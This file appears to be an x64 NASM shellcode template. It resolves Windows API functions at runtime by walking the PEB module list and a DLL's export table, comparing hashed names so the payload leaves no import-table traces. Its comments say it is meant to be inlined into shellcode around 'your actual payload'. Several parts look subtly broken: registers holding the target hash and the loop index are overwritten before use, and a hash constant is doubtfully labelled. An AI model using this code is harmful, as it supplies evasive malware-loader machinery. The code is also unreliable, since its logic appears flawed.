; =============================================================================
; peb-walk-x64.asm — NASM x64 PEB Walk + Export Table Resolution Template
; Resolves a function pointer at runtime with zero IAT exposure.
; Usage: assemble standalone or inline into shellcode
; nasm -f win64 peb-walk-x64.asm -o peb_walk.obj
; =============================================================================

BITS 64

; =============================================================================
; Constants — hash function seeds and pre-computed module hashes
; =============================================================================

; DJB2 hash seed
%define DJB2_SEED       5381

; Pre-computed DJB2 hashes (uppercase, case-insensitive)
; Compute offline: python3 -c "h=5381; [h:=((h<<5)+h+ord(c.upper()))&0xFFFFFFFF for c in 'KERNEL32.DLL']; print(hex(h))"
%define HASH_KERNEL32   0xBE2D0337   ; "KERNEL32.DLL"
%define HASH_NTDLL      0x3CFA685D   ; "NTDLL.DLL"

; Target function hash — example: LoadLibraryA
%define HASH_LOADLIBA   0xEC0E4E8E   ; DJB2("LoadLibraryA")

section .text

; =============================================================================
; align_rsp — entry wrapper ensuring 16-byte RSP alignment
; =============================================================================
global align_rsp
align_rsp:
    push  rsi
    mov   rsi, rsp
    and   rsp, -16
    sub   rsp, 0x20
    call  main_shellcode
    mov   rsp, rsi
    pop   rsi
    ret

; =============================================================================
; peb_get_module_base(hash: RCX) -> RAX = module base or 0
;   Walks PEB.Ldr.InMemoryOrderModuleList and returns the base of the module
;   whose BaseDllName hashes (DJB2, uppercase) to `hash`.
; =============================================================================
global peb_get_module_base
peb_get_module_base:
    push  rbx
    push  rsi
    push  rdi

    mov   rax, gs:[0x60]            ; PEB*
    mov   rax, [rax + 0x18]         ; PEB->Ldr (PEB_LDR_DATA*)
    lea   rbx, [rax + 0x20]         ; &InMemoryOrderModuleList.Flink
    mov   rsi, [rbx]                ; first entry

.walk_loop:
    cmp   rsi, rbx                  ; back to list head -> not found
    je    .not_found

    ; LDR_MODULE at RSI-0x10 (InMemoryOrderLinks is +0x10 into LDR_DATA_TABLE_ENTRY)
    ; BaseDllName (UNICODE_STRING) is at offset 0x58 from struct base
    ; = RSI - 0x10 + 0x58 = RSI + 0x48
    lea   rdi, [rsi + 0x48]         ; ptr to UNICODE_STRING BaseDllName
    movzx edx, word [rdi]           ; Length (bytes)
    mov   rdi, [rdi + 0x08]         ; Buffer (wchar_t*)

    ; hash the BaseDllName (wide chars, uppercase)
    call  hash_unicode_name         ; RDI=buf, EDX=len -> EAX=hash
    cmp   eax, ecx                  ; ecx = target hash (RCX preserved == first arg)
    jne   .next_entry

    ; found — return DllBase (at RSI - 0x10 + 0x30 = RSI + 0x20)
    mov   rax, [rsi + 0x20]         ; DllBase
    jmp   .done

.next_entry:
    mov   rsi, [rsi]                ; follow Flink
    jmp   .walk_loop

.not_found:
    xor   eax, eax

.done:
    pop   rdi
    pop   rsi
    pop   rbx
    ret

; =============================================================================
; hash_unicode_name(buf: RDI, len_bytes: EDX) -> EAX = DJB2 hash (uppercase)
; =============================================================================
hash_unicode_name:
    mov   eax, DJB2_SEED
    test  edx, edx
    jz    .done_hash
.char_loop:
    movzx ecx, word [rdi]       ; load wchar
    add   rdi, 2
    sub   edx, 2
    ; uppercase: if 'a'-'z' (0x61-0x7A) subtract 0x20
    cmp   cx, 0x61
    jl    .no_upper
    cmp   cx, 0x7A
    jg    .no_upper
    sub   cx, 0x20
.no_upper:
    ; DJB2: eax = ((eax << 5) + eax) + cx
    mov   r8d, eax
    shl   eax, 5
    add   eax, r8d
    add   eax, ecx
    test  edx, edx
    jg    .char_loop
.done_hash:
    ret

; =============================================================================
; get_proc_addr(module_base: RCX, func_hash: EDX) -> RAX = func ptr or 0
;   Walks PE export table and returns the address of the first export whose
;   name DJB2 hash matches func_hash.
; =============================================================================
global get_proc_addr
get_proc_addr:
    push  rbx
    push  rsi
    push  rdi
    push  r12
    push  r13
    push  r14

    mov   r12, rcx              ; module base
    mov   r13d, edx             ; target function hash

    ; Parse PE headers
    movsxd rbx, dword [r12 + 0x3C]  ; e_lfanew
    add   rbx, r12                   ; NT header

    ; DataDirectory[0] = IMAGE_EXPORT_DIRECTORY
    lea   rbx, [rbx + 0x88]          ; OptionalHeader + 0x70 (IMAGE_DIRECTORY_ENTRY_EXPORT)
    movsxd r14, dword [rbx]          ; export dir RVA
    add   r14, r12                   ; export dir VA

    mov   ecx, [r14 + 0x18]          ; NumberOfNames
    test  ecx, ecx
    jz    .not_found_proc

    movsxd rsi, dword [r14 + 0x20]   ; AddressOfNames RVA
    add   rsi, r12                   ; VA
    movsxd rdi, dword [r14 + 0x24]   ; AddressOfNameOrdinals RVA
    add   rdi, r12                   ; VA

    xor   r8d, r8d                   ; i = 0

.export_loop:
    cmp   r8d, ecx
    jge   .not_found_proc

    movsxd rbx, dword [rsi + r8*4]   ; AddressOfNames[i] RVA
    add   rbx, r12                   ; name VA (ASCII)

    ; hash ASCII name via DJB2
    push  rcx
    push  rsi
    push  rdi
    push  r8
    mov   rdi, rbx
    call  hash_ascii_name             ; RAX = DJB2 hash of ASCII string
    pop   r8
    pop   rdi
    pop   rsi
    pop   rcx

    cmp   eax, r13d
    je    .found_proc
    inc   r8d
    jmp   .export_loop

.found_proc:
    movsxd r8, dword [r14 + 0x1C]   ; AddressOfFunctions RVA
    add   r8, r12
    movzx ebx, word [rdi + r8d*2]   ; ordinal = AddressOfNameOrdinals[i]
    movsxd rax, dword [r8 + rbx*4]  ; AddressOfFunctions[ordinal] RVA
    add   rax, r12                   ; function VA
    jmp   .done_proc

.not_found_proc:
    xor   eax, eax

.done_proc:
    pop   r14
    pop   r13
    pop   r12
    pop   rdi
    pop   rsi
    pop   rbx
    ret

; =============================================================================
; hash_ascii_name(buf: RDI) -> EAX = DJB2 hash (case-sensitive)
; =============================================================================
hash_ascii_name:
    mov   eax, DJB2_SEED
.ascii_loop:
    movzx ecx, byte [rdi]
    test  cl, cl
    jz    .done_ascii
    mov   edx, eax
    shl   eax, 5
    add   eax, edx
    add   eax, ecx
    inc   rdi
    jmp   .ascii_loop
.done_ascii:
    ret

; =============================================================================
; main_shellcode — replace with your actual payload entry
; =============================================================================
main_shellcode:
    ; Example: resolve LoadLibraryA from KERNEL32.DLL
    mov   ecx, HASH_KERNEL32
    call  peb_get_module_base         ; RAX = KERNEL32.DLL base

    test  rax, rax
    jz    .exit

    mov   rcx, rax
    mov   edx, HASH_LOADLIBA
    call  get_proc_addr               ; RAX = &LoadLibraryA

    ; call LoadLibraryA("example.dll") — replace with actual work
    ; ...

.exit:
    ret
